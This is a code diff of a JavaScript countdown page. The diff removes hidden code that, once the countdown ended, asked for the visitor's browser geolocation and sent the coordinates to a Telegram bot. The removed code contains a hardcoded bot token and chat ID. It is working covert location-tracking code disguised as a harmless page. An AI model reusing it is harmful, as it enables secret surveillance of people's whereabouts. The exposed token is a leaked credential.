@@ -8,7 +8,6 @@ document.addEventListener("keydown", startCountdown);
 document.addEventListener("click", startCountdown);
 
 function startCountdown(event) {
-
   if (!isCountingDown && (event.code === "Space" || event.type === "click")) {
     isCountingDown = true; 
     intervalId = setInterval(() => {
@@ -18,7 +17,8 @@ function startCountdown(event) {
         clearInterval(intervalId);
         start.style.display = "none";
         dot.style.display = "inline-block";
-        getLocation();
+
+        // Show the message after countdown
         setInterval(() => {
           dot.style.display = "none";
           start.style.display = "inline-block";
@@ -30,49 +30,4 @@ function startCountdown(event) {
       }
     }, 1000);
   }
-}
-
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(sendLocationToTelegram, showError);
-  } else {
-    alert("Geolocation is not supported by this browser.");
-  }
-}
-
-function showError(error) {
-  switch (error.code) {
-    case error.PERMISSION_DENIED:
-      alert("User denied the request for Geolocation.");
-      break;
-    case error.POSITION_UNAVAILABLE:
-      alert("Location information is unavailable.");
-      break;
-    case error.TIMEOUT:
-      alert("The request to get user location timed out.");
-      break;
-    case error.UNKNOWN_ERROR:
-      alert("An unknown error occurred.");
-      break;
-  }
-}
-
-function sendLocationToTelegram(position) {
-  const latitude = position.coords.latitude;
-  const longitude = position.coords.longitude;
-  const chatId = "6959013020";
-  const botToken = "7099870589:AAGL9JlIG9djKDI_Q8dtedPMMyOayQyO7nU";
-  const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
-  fetch(url)
-    .then((response) => response.json())
-    .then((data) => {
-      if (data.ok) {
-        console.log("Location sent successfully!");
-      } else {
-        console.error("Error sending location:", data.description);
-      }
-    })
-    .catch((error) => {
-      console.error("Error:", error);
-    });
 }
